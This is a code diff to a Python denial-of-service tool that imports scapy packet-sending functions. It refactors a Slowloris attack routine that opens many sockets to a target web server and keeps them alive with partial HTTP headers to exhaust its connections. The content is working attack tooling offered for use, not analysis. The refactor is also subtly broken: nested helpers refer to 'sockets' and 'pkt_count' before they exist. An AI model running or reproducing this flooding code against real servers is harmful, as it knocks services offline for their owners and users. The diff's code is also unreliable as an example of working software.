@@ -5,6 +5,7 @@ import time
 from concurrent.futures import ThreadPoolExecutor, as_completed
 from urllib.parse import urlparse
 
+import ssl
 from colorama import init
 from rich.logging import RichHandler
 from scapy.all import ICMP, IP, TCP, UDP, send
@@ -79,8 +80,8 @@ def slowloris_attack(target_host, target_port, num_sockets=50):
     log.info(
         f"Starting Slowloris attack on {target_host}:{target_port} (sockets={num_sockets})"
     )
-    sockets = []
-    for i in range(num_sockets):
+    
+    def create_socket(i):
         try:
             s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
             s.settimeout(4)
@@ -89,41 +90,38 @@ def slowloris_attack(target_host, target_port, num_sockets=50):
             s.send(f"Host: {target_host}\r\n".encode())
             sockets.append(s)
             log.info(f"SLOWLORIS - SOCKET {i+1}/{num_sockets} opened")
+            return True
         except socket.timeout:
-            log.warning(
-                f"SLOWLORIS - Socket operation timed out for socket {i+1}. Skipping."
-            )
+            log.warning(f"SLOWLORIS - Socket operation timed out for socket {i+1}. Skipping.")
         except socket.error as e:
-            log.error(
-                f"SLOWLORIS - Socket error {e} when opening socket {i+1}. Skipping."
-            )
+            log.error(f"SLOWLORIS - Socket error {e} when opening socket {i+1}. Skipping.")
+        return False
+    
+    def send_headers(s, idx):
+        try:
+            s.send(b"X-a: b\r\n")
+            log.info(f"SLOWLORIS - HEADER {pkt_count} sent")
+            return True
+        except socket.timeout:
+            log.warning(f"SLOWLORIS - Socket operation timed out for socket {idx+1}. Removed.")
+        except socket.error as e:
+            log.error(f"SLOWLORIS - Socket error {e} for socket {idx+1}. Removed.")
+        except Exception as e:
+            log.critical(f"SLOWLORIS - Unexpected error {type(e).__name__} - {e} for socket {idx+1}. Removed.")
+        return False
+    
+    sockets = []
+    for i in range(num_sockets):
+        create_socket(i)
 
     try:
         pkt_count = 0
-        while True:
+        while sockets:
             for idx, s in enumerate(sockets[:]):
-                try:
-                    s.send(b"X-a: b\r\n")
-                    pkt_count += 1
-                    log.info(f"SLOWLORIS - HEADER {pkt_count} sent")
-                except socket.timeout:
+                pkt_count += 1
+                if not send_headers(s, idx):
                     sockets.remove(s)
                     s.close()
-                    log.warning(
-                        f"SLOWLORIS - Socket operation timed out for socket {idx+1}. Removed."
-                    )
-                except socket.error as e:
-                    sockets.remove(s)
-                    s.close()
-                    log.error(
-                        f"SLOWLORIS - Socket error {e} for socket {idx+1}. Removed."
-                    )
-                except Exception as e:
-                    sockets.remove(s)
-                    s.close()
-                    log.critical(
-                        f"SLOWLORIS - Unexpected error {type(e).__name__} - {e} for socket {idx+1}. Removed."
-                    )
             if not sockets:
                 log.warning("SLOWLORIS - No sockets left, stopping attack.")
                 break
